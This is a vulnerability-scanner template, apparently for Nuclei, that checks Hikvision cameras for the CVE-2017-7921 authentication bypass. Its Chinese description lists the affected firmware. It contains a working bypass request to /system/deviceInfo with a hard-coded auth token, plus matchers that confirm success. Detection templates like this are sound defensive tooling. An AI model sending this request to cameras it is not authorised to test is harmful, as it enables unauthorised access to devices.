id: CVE-2017-7921

info:
  name: 海康威视(hikvision) - 身份认证绕过漏洞
  author: wintry
  severity: critical
  description: |
    海康威视设备包含不正确的身份验证问题. 
    DS-2CD2xx2F-I系列 V5.2.0 build 140721至V5.4.0 build 160530,
    DS-2CD2xx0F-I系列 V5.2.0 build 140721至V5.4.0 Build 160401,
    DS-2CD2xx2FWD系列 V5.3.1 build 150410至V5.4.4 Build 161125,
    DS-2CD4x2xFWD 系列 V5.2.0 Build 140721 至 V5.4.0 Build 160414,
    DS-2CD4xx5 系列 V5.2.0 Build 140721 至 V5.4.0 Build 160421,
    DS-2DFx 系列 V5.2.0 Build 140805 至 V5.4.5 Build 160928,
    DS-2CD63xx 系列 V5.0.9 build 140305 到 V5.3.5 Build 160106.
    当应用程序未充分或正确地对用户进行身份验证时，就会出现不正确的身份验证漏洞.
    这可能允许恶意用户提升他或她在系统上的权限并获得对敏感信息的访问权限.
  remediation: 联系厂商修复.
  tags: hikvision
  metadata:
    max-request: 1

http:
  - method: GET
    path:
      - "{{BaseURL}}/system/deviceInfo?auth=YWRtaW46MTEK"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "<firmwareVersion>"
        part: body

      - type: word
        words:
          - "application/xml"
        part: header